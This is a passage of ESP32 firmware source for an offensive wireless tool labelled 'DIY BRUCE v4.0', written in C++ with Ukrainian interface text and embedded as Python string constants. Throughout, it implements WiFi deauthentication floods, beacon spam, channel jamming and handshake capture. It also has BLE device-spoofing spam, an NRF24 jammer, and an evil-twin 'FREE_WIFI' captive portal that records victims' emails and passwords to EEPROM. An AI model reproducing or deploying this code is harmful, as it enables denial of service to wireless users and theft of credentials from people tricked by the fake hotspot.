void showWiFiPasswords();
void clearWiFiPasswords();
void setWiFiChannel();
void stopAllAttacks();

#ifdef __cplusplus
}
#endif

#endif
'''

WIFI_CPP = '''#include "WiFiAttack.h"
#include <U8g2lib.h>
#include "Storage.h"

extern U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2;
extern void showMsg(const char* msg, int delayMs);
extern bool btn(int pin);
#define BTN_BACK 26
#define BTN_OK 12

int networkCount = 0;
String networkNames[50];
uint8_t networkBSSID[50][6];
int networkChannel[50];
int networkRSSI[50];
bool deauthActive = false;
unsigned long deauthPackets = 0;
bool beaconActive = false;
unsigned long beaconPackets = 0;
bool evilActive = false;
bool wifiJamActive = false;
bool handshakeCapturing = false;
String currentTargetSSID = "";
uint8_t targetBSSID[6];
int eapolCount = 0;
int lastRSSI = -50;

// Розширена функція сканування з детальним виводом
void scanWiFi() {
    showMsg("🔍 Сканування WiFi...", 500);
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(200);
    networkCount = WiFi.scanNetworks();
    if(networkCount > 50) networkCount = 50;
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.drawStr(5, 10, "Знайдено мереж:");
    char buf[16];
    sprintf(buf, "%d", networkCount);
    u8g2.drawStr(5, 25, buf);
    for(int i = 0; i < min(networkCount, 10); i++) {
        networkNames[i] = WiFi.SSID(i);
        networkChannel[i] = WiFi.channel(i);
        networkRSSI[i] = WiFi.RSSI(i);
        memcpy(networkBSSID[i], WiFi.BSSID(i), 6);
        u8g2.drawStr(5, 40 + i * 8, networkNames[i].substring(0, 12).c_str());
    }
    u8g2.sendBuffer();
    delay(2000);
    WiFi.mode(WIFI_AP_STA);
    showMsg("Готово до роботи", 1000);
}

// Відправка deauth пакету з усіма параметрами
void sendDeauthPacket(uint8_t* bssid, uint8_t* client, int channel) {
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    uint8_t packet[26] = {
        0xC0, 0x00, 0x00, 0x00,
        client[0], client[1], client[2], client[3], client[4], client[5],
        bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
        bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
        0x00, 0x00, 0x07, 0x00
    };
    esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
    deauthPackets++;
}

// Деавтентифікація з вибором цілі
void startWiFiDeauth() {
    if(networkCount == 0) {
        showMsg("Спочатку виконайте SCAN!", 1500);
        return;
    }
    int targetIdx = 0;
    while(true) {
        u8g2.clearBuffer();
        u8g2.setFont(u8g2_font_6x10_tr);
        u8g2.drawStr(5, 15, "Виберіть ціль:");
        for(int i = 0; i < min(networkCount, 4); i++) {
            if(i == targetIdx) u8g2.drawStr(5, 30 + i * 10, ">");
            u8g2.drawStr(20, 30 + i * 10, networkNames[i].substring(0, 14).c_str());
        }
        u8g2.drawStr(5, 60, "UP/DN=вибір OK=старт");
        u8g2.sendBuffer();
        if(btn(15) && targetIdx > 0) targetIdx--;
        else if(btn(13) && targetIdx < min(networkCount, 4) - 1) targetIdx++;
        else if(btn(BTN_OK)) break;
        else if(btn(BTN_BACK)) return;
        delay(50);
    }
    deauthActive = true;
    deauthPackets = 0;
    int ch = networkChannel[targetIdx];
    uint8_t* bssid = networkBSSID[targetIdx];
    uint8_t broadcast[] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
    showMsg("DEAUTH запущено на " + networkNames[targetIdx], 1000);
    while(deauthActive) {
        sendDeauthPacket(bssid, broadcast, ch);
        u8g2.clearBuffer();
        u8g2.setFont(u8g2_font_helvB08_tr);
        u8g2.drawStr(20, 25, "DEAUTH ACTIVE");
        u8g2.setFont(u8g2_font_6x10_tr);
        char buf[32];
        sprintf(buf, "Пакетів: %lu", deauthPackets);
        u8g2.drawStr(5, 45, buf);
        u8g2.drawStr(5, 60, "BACK - Зупинити");
        u8g2.sendBuffer();
        if(btn(BTN_BACK)) deauthActive = false;
        delay(50);
    }
    showMsg("DEAUTH зупинено", 1000);
}

void stopWiFiDeauth() { deauthActive = false; }

// Бікон-спам з генерацією фейкових SSID
void startWiFiBeacon() {
    beaconActive = true;
    beaconPackets = 0;
    const char* ssids[] = {"FREE_WIFI", "Starbucks WiFi", "Airport_Free", "Metro_Free", "PublicWiFi", "VPN_Secure"};
    int ssidCount = 6;
    showMsg("BEACON SPAM запущено", 1000);
    while(beaconActive) {
        for(int s = 0; s < ssidCount && beaconActive; s++) {
            uint8_t bssid[6];
            for(int i = 0; i < 6; i++) bssid[i] = random(256);
            bssid[0] |= 0x02;
            const char* ssid = ssids[s];
            uint8_t packet[200];
            int len = 0;
            packet[len++] = 0x80; packet[len++] = 0x00;
            packet[len++] = 0x00; packet[len++] = 0x00;
            for(int i = 0; i < 6; i++) packet[len++] = 0xFF;
            for(int i = 0; i < 6; i++) packet[len++] = bssid[i];
            for(int i = 0; i < 6; i++) packet[len++] = bssid[i];
            packet[len++] = 0x00; packet[len++] = 0x00;
            for(int i = 0; i < 8; i++) packet[len++] = 0x00;
            packet[len++] = 0x64; packet[len++] = 0x00;
            packet[len++] = 0x11; packet[len++] = 0x00;
            packet[len++] = 0x00; packet[len++] = strlen(ssid);
            for(int i = 0; i < (int)strlen(ssid); i++) packet[len++] = ssid[i];
            esp_wifi_80211_tx(WIFI_IF_STA, packet, len, false);
            beaconPackets++;
        }
        u8g2.clearBuffer();
        u8g2.setFont(u8g2_font_helvB08_tr);
        u8g2.drawStr(20, 25, "BEACON ACTIVE");
        u8g2.setFont(u8g2_font_6x10_tr);
        char buf[32];
        sprintf(buf, "Відправлено: %lu", beaconPackets);
        u8g2.drawStr(5, 45, buf);
        u8g2.drawStr(5, 60, "BACK - Зупинити");
        u8g2.sendBuffer();
        if(btn(BTN_BACK)) beaconActive = false;
        delay(30);
    }
}

void stopWiFiBeacon() { beaconActive = false; }
void startEvilTwin() { extern void startEvilTwinPortal(); startEvilTwinPortal(); }
void stopEvilTwin() { extern void stopEvilTwinPortal(); stopEvilTwinPortal(); }

// WiFi Jammer на всіх каналах
void startWiFiJammer() {
    wifiJamActive = true;
    showMsg("WIFI JAMMER запущено", 1000);
    while(wifiJamActive) {
        for(int ch = 1; ch <= 13; ch++) {
            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
            uint8_t packet[128];
            for(int i = 0; i < 20; i++) {
                esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
            }
            delay(2);
        }
        u8g2.clearBuffer();
        u8g2.setFont(u8g2_font_helvB08_tr);
        u8g2.drawStr(15, 30, "WIFI JAMMER");
        u8g2.setFont(u8g2_font_6x10_tr);
        u8g2.drawStr(5, 50, "Знищення каналів 1-13");
        u8g2.drawStr(5, 62, "BACK - Зупинити");
        u8g2.sendBuffer();
        if(btn(BTN_BACK)) wifiJamActive = false;
        delay(50);
    }
    showMsg("WIFI JAMMER зупинено", 1000);
}

void stopWiFiJammer() { wifiJamActive = false; }

// Перехоплення handshake з проміскуозним режимом
void handshakeSniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
    if(!handshakeCapturing) return;
    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    int len = pkt->rx_ctrl.sig_len;
    uint8_t *payload = pkt->payload;
    if(len < 30) return;
    for(int i = 0; i < len - 8; i++) {
        if(payload[i] == 0x88 && payload[i+1] == 0x8E) {
            eapolCount++;
            handshakes += "[HANDSHAKE] " + currentTargetSSID + " | Час: " + String(millis()/1000) + "с\\n";
            savePasswordsToEEPROM();
            showMsg("HANDSHAKE ЗАХОПЛЕНО!", 2000);
            handshakeCapturing = false;
            return;
        }
    }
}

void startHandshakeSniffer() {
    if(networkCount == 0) {
        showMsg("Спочатку виконайте SCAN!", 1500);
        return;
    }
    int targetIdx = 0;
    while(true) {
        u8g2.clearBuffer();
        u8g2.setFont(u8g2_font_6x10_tr);
        u8g2.drawStr(5, 15, "Виберіть мережу:");
        for(int i = 0; i < min(networkCount, 5); i++) {
            if(i == targetIdx) u8g2.drawStr(5, 30 + i * 8, ">");
            u8g2.drawStr(20, 30 + i * 8, networkNames[i].substring(0, 14).c_str());
        }
        u8g2.drawStr(5, 60, "OK - Захопити  BACK");
        u8g2.sendBuffer();
        if(btn(15) && targetIdx > 0) targetIdx--;
        else if(btn(13) && targetIdx < min(networkCount, 5) - 1) targetIdx++;
        else if(btn(BTN_OK)) break;
        else if(btn(BTN_BACK)) return;
        delay(50);
    }
    currentTargetSSID = networkNames[targetIdx];
    memcpy(targetBSSID, networkBSSID[targetIdx], 6);
    esp_wifi_set_channel(networkChannel[targetIdx], WIFI_SECOND_CHAN_NONE);
    eapolCount = 0;
    handshakeCapturing = true;
    showMsg("Захоплення handshake... до 30с", 1500);
    unsigned long start = millis();
    while(handshakeCapturing && millis() - start < 30000) {
        uint8_t broadcast[] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
        sendDeauthPacket(targetBSSID, broadcast, networkChannel[targetIdx]);
        u8g2.clearBuffer();
        u8g2.setFont(u8g2_font_6x10_tr);
        char buf[32];
        sprintf(buf, "EAPOL: %d", eapolCount);
        u8g2.drawStr(5, 30, buf);
        sprintf(buf, "Час: %d/30с", (millis() - start)/1000);
        u8g2.drawStr(5, 45, buf);
        u8g2.drawStr(5, 60, "BACK - Вихід");
        u8g2.sendBuffer();
        if(btn(BTN_BACK)) handshakeCapturing = false;
        delay(100);
    }
    handshakeCapturing = false;
    if(eapolCount > 0) showMsg("HANDSHAKE збережено!", 1500);
    else showMsg("Не вдалося захопити", 1500);
}

void stopHandshakeSniffer() { handshakeCapturing = false; }

void startWiFiMonitor() {
    showMsg("Монітор RSSI...", 1000);
    while(true) {
        lastRSSI = WiFi.RSSI();
        u8g2.clearBuffer();
        u8g2.setFont(u8g2_font_helvB18_tr);
        char buf[16];
        sprintf(buf, "%d dBm", lastRSSI);
        u8g2.drawStr(10, 35, buf);
        u8g2.setFont(u8g2_font_5x7_tr);
        u8g2.drawStr(5, 60, "BACK - Вихід");
        u8g2.sendBuffer();
        if(btn(BTN_BACK)) break;
        delay(500);
    }
}

void stopWiFiMonitor() { }
void startWiFiInfo() {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.drawStr(5, 15, "WiFi Info");
    u8g2.drawStr(5, 30, "MAC: " + WiFi.macAddress());
    char buf[32];
    sprintf(buf, "Канал: %d", WiFi.channel());
    u8g2.drawStr(5, 45, buf);
    sprintf(buf, "RSSI: %d dBm", WiFi.RSSI());
    u8g2.drawStr(5, 60, buf);
    u8g2.sendBuffer();
    while(!btn(BTN_BACK)) delay(50);
}
void saveWiFiPasswords() { savePasswordsToEEPROM(); showMsg("Паролі збережено!", 1000); }
void showWiFiPasswords() {
    if(capturedPasswords.length() == 0) showMsg("Немає збережених паролів", 1500);
    else showMsg(capturedPasswords.substring(0, 45).c_str(), 2000);
}
void clearWiFiPasswords() { capturedPasswords = ""; handshakes = ""; savePasswordsToEEPROM(); showMsg("Всі дані очищено!", 1000); }
void setWiFiChannel() {
    int ch = 1;
    while(true) {
        u8g2.clearBuffer();
        u8g2.setFont(u8g2_font_6x10_tr);
        u8g2.drawStr(40, 15, "Канал WiFi");
        u8g2.setFont(u8g2_font_logisoso24_tr);
        char buf[8];
        sprintf(buf, "%d", ch);
        int w = u8g2.getStrWidth(buf);
        u8g2.drawStr((128-w)/2, 48, buf);
        u8g2.drawStr(5, 30, "<");
        u8g2.drawStr(110, 30, ">");
        u8g2.setFont(u8g2_font_5x7_tr);
        u8g2.drawStr(2, 63, "LR=зміна OK=встановити BACK");
        u8g2.sendBuffer();
        if(btn(14) && ch > 1) ch--;
        else if(btn(27) && ch < 14) ch++;
        else if(btn(BTN_OK)) {
            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
            showMsg("Канал встановлено!", 1000);
            break;
        } else if(btn(BTN_BACK)) break;
        delay(50);
    }
}
void stopAllAttacks() { deauthActive = false; beaconActive = false; wifiJamActive = false; evilActive = false; handshakeCapturing = false; showMsg("ВСІ АТАКИ ЗУПИНЕНО", 1500); }
'''

BLE_H = '''#ifndef BLEATTACK_H
#define BLEATTACK_H

#include <Arduino.h>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEScan.h>
#include <BLEAdvertising.h>
#include <BLEAdvertisedDevice.h>

extern int bleFound;
extern bool bleJamActive;
extern bool bleSpamActive;

void scanBLE();
void startBLEAppleJuice();
void startBLESamsung();
void startBLEAndroid();
void startBLEWindows();
void startBLEiPhone();
void startBLEAirPods();
void startBLESpamAll();
void startBLEJammer();
void stopBLEJammer();
void startBLEInfo();
void stopBLEAttack();

#endif
'''

BLE_CPP = '''#include "BLEAttack.h"
#include <U8g2lib.h>

extern U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2;
extern void showMsg(const char* msg, int delayMs);
extern bool btn(int pin);
#define BTN_BACK 26

int bleFound = 0;
bool bleJamActive = false;
bool bleSpamActive = false;

class MyAdvertisedDeviceCallbacks : public BLEAdvertisedDeviceCallbacks {
    void onResult(BLEAdvertisedDevice advertisedDevice) override {
        bleFound++;
    }
};

void scanBLE() {
    bleFound = 0;
    showMsg("🔍 Сканування BLE...", 500);
    BLEDevice::init("");
    BLEScan* pBLEScan = BLEDevice::getScan();
    pBLEScan->setAdvertisedDeviceCallbacks(new MyAdvertisedDeviceCallbacks());
    pBLEScan->setActiveScan(true);
    pBLEScan->setInterval(100);
    pBLEScan->setWindow(99);
    BLEScanResults* results = pBLEScan->start(5, false);
    bleFound = results->getCount();
    char buf[32];
    sprintf(buf, "Знайдено: %d", bleFound);
    showMsg(buf, 1500);
    pBLEScan->clearResults();
    BLEDevice::deinit();
}

void sendBLEAdvertisement(const char* name, const uint8_t* manufData, int manufLen) {
    BLEDevice::init("ESP_SPAM");
    BLEAdvertising* pAdvertising = BLEDevice::getAdvertising();
    BLEAdvertisementData advData;
    advData.setFlags(0x06);
    if(name && strlen(name) > 0) advData.setName(name);
    if(manufData && manufLen > 0) advData.setManufacturerData(manufData, manufLen);
    pAdvertising->setAdvertisementData(advData);
    pAdvertising->start();
    delay(50);
    pAdvertising->stop();
    BLEDevice::deinit();
}

void startBLEAppleJuice() {
    showMsg("🍎 APPLEJUICE SPAM", 1000);
    const uint8_t appleData[] = {0x4C, 0x00, 0x0F, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    for(int i = 0; i < 50; i++) {
        sendBLEAdvertisement(nullptr, appleData, sizeof(appleData));
        u8g2.clearBuffer();
        u8g2.setFont(u8g2_font_helvB08_tr);
        u8g2.drawStr(10, 30, "APPLEJUICE");
        u8g2.setFont(u8g2_font_6x10_tr);
        char buf[32];
        sprintf(buf, "Пакет %d/50", i+1);
        u8g2.drawStr(5, 50, buf);
        u8g2.sendBuffer();
        if(btn(BTN_BACK)) break;
        delay(30);
    }
    showMsg("APPLEJUICE завершено", 1000);
}

void startBLESamsung() {
    showMsg("📱 SAMSUNG SPAM", 1000);
    for(int i = 0; i < 50; i++) {
        String name = "Samsung_" + String(random(10000));
        sendBLEAdvertisement(name.c_str(), nullptr, 0);
        if(btn(BTN_BACK)) break;
        delay(30);
    }
    showMsg("SAMSUNG завершено", 1000);
}

void startBLEAndroid() {
    showMsg("🤖 ANDROID SPAM", 1000);
    for(int i = 0; i < 50; i++) {
        String name = "Android_" + String(random(10000));
        sendBLEAdvertisement(name.c_str(), nullptr, 0);
        if(btn(BTN_BACK)) break;
        delay(30);
    }
    showMsg("ANDROID завершено", 1000);
}

void startBLEWindows() {
    showMsg("💻 WINDOWS SPAM", 1000);
    for(int i = 0; i < 50; i++) {
        String name = "Windows_" + String(random(10000));
        sendBLEAdvertisement(name.c_str(), nullptr, 0);
        if(btn(BTN_BACK)) break;
        delay(30);
    }
    showMsg("WINDOWS завершено", 1000);
}

void startBLEiPhone() {
    showMsg("📱 IPHONE SPAM", 1000);
    for(int i = 0; i < 50; i++) {
        String name = "iPhone_" + String(random(10000));
        sendBLEAdvertisement(name.c_str(), nullptr, 0);
        if(btn(BTN_BACK)) break;
        delay(30);
    }
    showMsg("IPHONE завершено", 1000);
}

void startBLEAirPods() {
    showMsg("🎧 AIRPODS SPAM", 1000);
    const uint8_t airpodsData[] = {0x4C, 0x00, 0x07, 0x0F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    for(int i = 0; i < 50; i++) {
        sendBLEAdvertisement(nullptr, airpodsData, sizeof(airpodsData));
        if(btn(BTN_BACK)) break;
        delay(30);
    }
    showMsg("AIRPODS завершено", 1000);
}

void startBLESpamAll() {
    showMsg("🌐 ЗАПУСК ВСІХ BLE АТАК", 1000);
    startBLEAppleJuice();
    startBLESamsung();
    startBLEAndroid();
    startBLEWindows();
    startBLEiPhone();
    startBLEAirPods();
    showMsg("ВСІ BLE АТАКИ ЗАВЕРШЕНО", 1500);
}

void startBLEJammer() {
    bleJamActive = true;
    showMsg("⚠️ BLE JAMMER ЗАПУЩЕНО", 1000);
    while(bleJamActive) {
        String randomName = "JAM_" + String(random(99999));
        BLEDevice::init(randomName.c_str());
        BLEAdvertising* pAdv = BLEDevice::getAdvertising();
        BLEAdvertisementData advData;
        advData.setFlags(0x06);
        advData.setName(randomName);
        pAdv->setAdvertisementData(advData);
        pAdv->start();
        delay(20);
        pAdv->stop();
        BLEDevice::deinit();
        u8g2.clearBuffer();
        u8g2.setFont(u8g2_font_helvB08_tr);
        u8g2.drawStr(15, 30, "BLE JAMMER");
        u8g2.setFont(u8g2_font_6x10_tr);
        u8g2.drawStr(5, 55, "BACK - Зупинити");
        u8g2.sendBuffer();
        if(btn(BTN_BACK)) bleJamActive = false;
        delay(10);
    }
    showMsg("BLE JAMMER ЗУПИНЕНО", 1000);
}

void stopBLEJammer() { bleJamActive = false; }

void startBLEInfo() {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.drawStr(5, 15, "BLE Інформація");
    BLEDevice::init("INFO");
    u8g2.drawStr(5, 30, "MAC: " + BLEDevice::getAddress().toString());
    u8g2.drawStr(5, 45, "Статус: Готовий");
    BLEDevice::deinit();
    u8g2.drawStr(5, 60, "BACK - Вихід");
    u8g2.sendBuffer();
    while(!btn(BTN_BACK)) delay(50);
}

void stopBLEAttack() { bleJamActive = false; bleSpamActive = false; showMsg("BLE зупинено", 1000); }
'''

NRF_H = '''#ifndef NRF24ATTACK_H
#define NRF24ATTACK_H

#include <Arduino.h>
#include <SPI.h>
#include <RF24.h>

extern RF24 radio;
extern bool nrfOK;
extern uint8_t nrfCh;
extern bool nrfJamActive;
extern unsigned long nrfJamPackets;

void initNRF();
void scanNRF();
void startNRFJammer();
void stopNRFJammer();
void startNRFSend();
void startNRFInfo();
void setNRFChannel();
void stopNRFAttack();

#endif
'''

NRF_CPP = '''#include "NRF24Attack.h"
#include <U8g2lib.h>

extern U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2;
extern void showMsg(const char* msg, int delayMs);
extern bool btn(int pin);
#define BTN_BACK 26
#define BTN_OK 12

RF24 radio(4, 5);
bool nrfOK = false;
uint8_t nrfCh = 76;
bool nrfJamActive = false;
unsigned long nrfJamPackets = 0;

void initNRF() {
    if(!radio.begin()) {
        nrfOK = false;
        showMsg("NRF24 не знайдено!", 1500);
        return;
    }
    radio.setChannel(nrfCh);
    radio.setPALevel(RF24_PA_LOW);
    radio.setDataRate(RF24_1MBPS);
    radio.setAutoAck(false);
    radio.setPayloadSize(32);
    nrfOK = true;
    showMsg("NRF24 готовий", 1000);
}

void scanNRF() {
    if(!nrfOK) { showMsg("NRF24 не підключено!", 1500); return; }
    int activeChannels = 0;
    showMsg("Сканування NRF каналів 0-125...", 500);
    for(int ch = 0; ch <= 125; ch++) {
        radio.setChannel(ch);
        radio.startListening();
        delayMicroseconds(200);
        if(radio.testCarrier()) activeChannels++;
        radio.stopListening();
        if(ch % 20 == 0) {
            u8g2.clearBuffer();
            u8g2.setFont(u8g2_font_6x10_tr);
            char buf[32];
            sprintf(buf, "Сканування: %d/125", ch);
            u8g2.drawStr(5, 30, buf);
            u8g2.sendBuffer();
        }
    }
    radio.setChannel(nrfCh);
    char buf[32];
    sprintf(buf, "Активних: %d", activeChannels);
    showMsg(buf, 1500);
}

void startNRFJammer() {
    if(!nrfOK) { showMsg("NRF24 не підключено!", 1500); return; }
    nrfJamActive = true;
    nrfJamPackets = 0;
    radio.stopListening();
    showMsg("NRF JAMMER запущено", 1000);
    while(nrfJamActive) {
        for(int ch = 0; ch <= 125 && nrfJamActive; ch++) {
            radio.setChannel(ch);
            uint8_t junk[32];
            for(int i = 0; i < 32; i++) junk[i] = random(256);
            radio.write(&junk, 32);
            nrfJamPackets++;
        }
        u8g2.clearBuffer();
        u8g2.setFont(u8g2_font_helvB08_tr);
        u8g2.drawStr(15, 25, "NRF JAMMER");
        u8g2.setFont(u8g2_font_6x10_tr);
        char buf[32];
        sprintf(buf, "Пакетів: %lu", nrfJamPackets);
        u8g2.drawStr(5, 45, buf);
        u8g2.drawStr(5, 60, "BACK - Зупинити");
        u8g2.sendBuffer();
        if(btn(BTN_BACK)) nrfJamActive = false;
        delay(5);
    }
    radio.setChannel(nrfCh);
    showMsg("NRF JAMMER зупинено", 1000);
}

void stopNRFJammer() { nrfJamActive = false; }

void startNRFSend() {
    if(!nrfOK) { showMsg("NRF24 не підключено!", 1500); return; }
    radio.stopListening();
    uint8_t addr[6] = "00001";
    radio.openWritingPipe(addr);
    char message[32] = "HELLO FROM BRUCE";
    showMsg("Відправка даних...", 1000);
    for(int i = 0; i < 20; i++) {
        radio.write(&message, sizeof(message));
        u8g2.clearBuffer();
        u8g2.setFont(u8g2_font_6x10_tr);
        u8g2.drawStr(5, 30, "Відправлено:");
        u8g2.drawStr(5, 45, message);
        char buf[16];
        sprintf(buf, "Пакет %d/20", i+1);
        u8g2.drawStr(5, 60, buf);
        u8g2.sendBuffer();
        delay(200);
        if(btn(BTN_BACK)) break;
    }
    showMsg("Відправку завершено", 1000);
}

void startNRFInfo() {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.drawStr(5, 15, "NRF24 Info");
    char buf[32];
    sprintf(buf, "Статус: %s", nrfOK ? "ПІДКЛЮЧЕНО" : "НЕМАЄ");
    u8g2.drawStr(5, 30, buf);
    sprintf(buf, "Канал: %d", nrfCh);
    u8g2.drawStr(5, 45, buf);
    u8g2.drawStr(5, 60, "BACK - Вихід");
    u8g2.sendBuffer();
    while(!btn(BTN_BACK)) delay(50);
}

void setNRFChannel() {
    while(true) {
        u8g2.clearBuffer();
        u8g2.setFont(u8g2_font_6x10_tr);
        u8g2.drawStr(35, 15, "NRF Канал");
        u8g2.setFont(u8g2_font_logisoso24_tr);
        char buf[8];
        sprintf(buf, "%d", nrfCh);
        int w = u8g2.getStrWidth(buf);
        u8g2.drawStr((128-w)/2, 48, buf);
        u8g2.drawStr(5, 30, "<");
        u8g2.drawStr(110, 30, ">");
        u8g2.setFont(u8g2_font_5x7_tr);
        u8g2.drawStr(2, 63, "LR=зміна OK=зберегти BACK");
        u8g2.sendBuffer();
        if(btn(14) && nrfCh > 0) nrfCh--;
        else if(btn(27) && nrfCh < 125) nrfCh++;
        else if(btn(BTN_OK)) {
            if(nrfOK) radio.setChannel(nrfCh);
            showMsg("Канал збережено!", 1000);
            break;
        } else if(btn(BTN_BACK)) break;
        delay(50);
    }
}
void stopNRFAttack() { nrfJamActive = false; showMsg("NRF зупинено", 1000); }
'''

WEB_H = '''#ifndef WEBSERVER_H
#define WEBSERVER_H

#include <Arduino.h>
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>

extern WebServer server;
extern DNSServer dnsServer;
extern bool webRunning;

void startEvilTwinPortal();
void stopEvilTwinPortal();
void startWebServer();
void stopWebServer();

#endif
'''

WEB_CPP = '''#include "WebServer.h"
#include <U8g2lib.h>
#include "Storage.h"

extern U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2;
extern int deauthPackets, beaconPackets, lastRSSI;
extern String capturedPasswords, handshakes;
extern void scanWiFi();
extern void startWiFiDeauth();
extern void stopWiFiDeauth();
extern void startWiFiBeacon();
extern void stopWiFiBeacon();
extern void startHandshakeSniffer();
extern void startWiFiJammer();
extern void stopWiFiJammer();
extern void startWiFiMonitor();
extern void startWiFiInfo();
extern void clearWiFiPasswords();
extern void setWiFiChannel();
extern void stopAllAttacks();
extern void scanBLE();
extern void startBLEAppleJuice();
extern void startBLESamsung();
extern void startBLEAndroid();
extern void startBLEWindows();
extern void startBLEiPhone();
extern void startBLEAirPods();
extern void startBLESpamAll();
extern void startBLEJammer();
extern void stopBLEJammer();
extern void startBLEInfo();
extern void stopBLEAttack();
extern void scanNRF();
extern void startNRFJammer();
extern void stopNRFJammer();
extern void startNRFSend();
extern void startNRFInfo();
extern void setNRFChannel();
extern void stopNRFAttack();
extern void formatStorage();
extern void rebootDevice();
extern void showMsg(const char* msg, int delayMs);
extern bool webRunning;
extern bool evilActive;

WebServer server(80);
DNSServer dnsServer;
bool webRunning = false;
bool evilActive = false;
extern const char* adminPage;
extern const char* evilPage;

void handleRoot() { server.send(200, "text/html", adminPage); }
void handleData() {
    String json = "{\\"deauth\\":" + String(deauthPackets) + ",\\"beacon\\":" + String(beaconPackets) + ",\\"rssi\\":" + String(lastRSSI) + ",\\"batt\\":67,\\"uptime\\":" + String(millis()/1000) + "}";
    server.send(200, "application/json", json);
}
void handleCmd() {
    if(!server.hasArg("c")) { server.send(200, "text/plain", "NO CMD"); return; }
    String cmd = server.arg("c");
    String resp = "OK\\n";
    if(cmd == "scan") { scanWiFi(); }
    else if(cmd == "deauth_start") { startWiFiDeauth(); }
    else if(cmd == "deauth_stop") { stopWiFiDeauth(); }
    else if(cmd == "beacon_start") { startWiFiBeacon(); }
    else if(cmd == "beacon_stop") { stopWiFiBeacon(); }
    else if(cmd == "evil_start") { startEvilTwinPortal(); }
    else if(cmd == "evil_stop") { stopEvilTwinPortal(); }
    else if(cmd == "handshake") { startHandshakeSniffer(); }
    else if(cmd == "wifi_jam") { startWiFiJammer(); }
    else if(cmd == "wifi_monitor") { startWiFiMonitor(); }
    else if(cmd == "wifi_info") { startWiFiInfo(); }
    else if(cmd == "set_channel") { setWiFiChannel(); }
    else if(cmd == "ble_scan") { scanBLE(); }
    else if(cmd == "ble_apple") { startBLEAppleJuice(); }
    else if(cmd == "ble_samsung") { startBLESamsung(); }
    else if(cmd == "ble_android") { startBLEAndroid(); }
    else if(cmd == "ble_windows") { startBLEWindows(); }
    else if(cmd == "ble_iphone") { startBLEiPhone(); }
    else if(cmd == "ble_airpods") { startBLEAirPods(); }
    else if(cmd == "ble_all") { startBLESpamAll(); }
    else if(cmd == "ble_jam") { startBLEJammer(); }
    else if(cmd == "ble_stop") { stopBLEAttack(); }
    else if(cmd == "ble_info") { startBLEInfo(); }
    else if(cmd == "nrf_scan") { scanNRF(); }
    else if(cmd == "nrf_jam") { startNRFJammer(); }
    else if(cmd == "nrf_stop") { stopNRFAttack(); }
    else if(cmd == "nrf_send") { startNRFSend(); }
    else if(cmd == "nrf_info") { startNRFInfo(); }
    else if(cmd == "nrf_set_ch") { setNRFChannel(); }
    else if(cmd == "view_pass") { resp = capturedPasswords.length() ? capturedPasswords : "(пусто)"; }
    else if(cmd == "view_hand") { resp = handshakes.length() ? handshakes : "(пусто)"; }
    else if(cmd == "clear_pass") { clearWiFiPasswords(); }
    else if(cmd == "format") { formatStorage(); }
    else if(cmd == "web_on") { startWebServer(); }
    else if(cmd == "web_off") { stopWebServer(); }
    else if(cmd == "reboot") { rebootDevice(); }
    else if(cmd == "reset") { rebootDevice(); }
    else if(cmd == "sysinfo") { resp = "DIY BRUCE v4.0\\nESP32\\nUptime: " + String(millis()/1000) + "с\\nHeap: " + String(ESP.getFreeHeap()) + " байт"; }
    else { resp = "UNKNOWN CMD"; }
    server.send(200, "text/plain", resp);
}
void startEvilTwinPortal() {
    if(evilActive) return;
    WiFi.softAP("FREE_WIFI", NULL);
    dnsServer.start(53, "*", WiFi.softAPIP());
    server.on("/", [](){ server.send(200, "text/html", evilPage); });
    server.on("/pass", HTTP_POST, [](){
        String email = server.hasArg("email") ? server.arg("email") : "";
        String pwd = server.hasArg("password") ? server.arg("password") : "";
        if(email.length() > 0 || pwd.length() > 0) {
            capturedPasswords += "[PASS] " + email + " | " + pwd + " | " + String(millis()/1000) + "с\\n";
            savePasswordsToEEPROM();
        }
        server.send(200, "text/html", "<html><body style='text-align:center;padding-top:100px;'><h2>Перевірка...</h2><script>setTimeout(function(){window.location.href='/';},2000);</script></body></html>");
    });
    server.on("/cmd", handleCmd);
    server.on("/data", handleData);
    server.begin();
    evilActive = true;
    showMsg("EVIL PORTAL: FREE_WIFI", 1500);
    while(evilActive) {
        dnsServer.processNextRequest();
        server.handleClient();
        u8g2.clearBuffer();
        u8g2.setFont(u8g2_font_helvB08_tr);
        u8g2.drawStr(20, 25, "EVIL PORTAL");
        u8g2.setFont(u8g2_font_6x10_tr);
        u8g2.drawStr(5, 45, "SSID: FREE_WIFI");
        u8g2.drawStr(5, 60, "BACK - Зупинити");
        u8g2.sendBuffer();
        if(btn(26)) { evilActive = false; }
        delay(100);
    }
    stopEvilTwinPortal();
}
void stopEvilTwinPortal() {
    dnsServer.stop();
    server.stop();
    WiFi.softAPdisconnect(true);
    server.on("/", handleRoot);
    server.on("/cmd", handleCmd);
    server.on("/data", handleData);
    server.begin();
    evilActive = false;
    showMsg("EVIL PORTAL зупинено", 1000);
}
void startWebServer() {
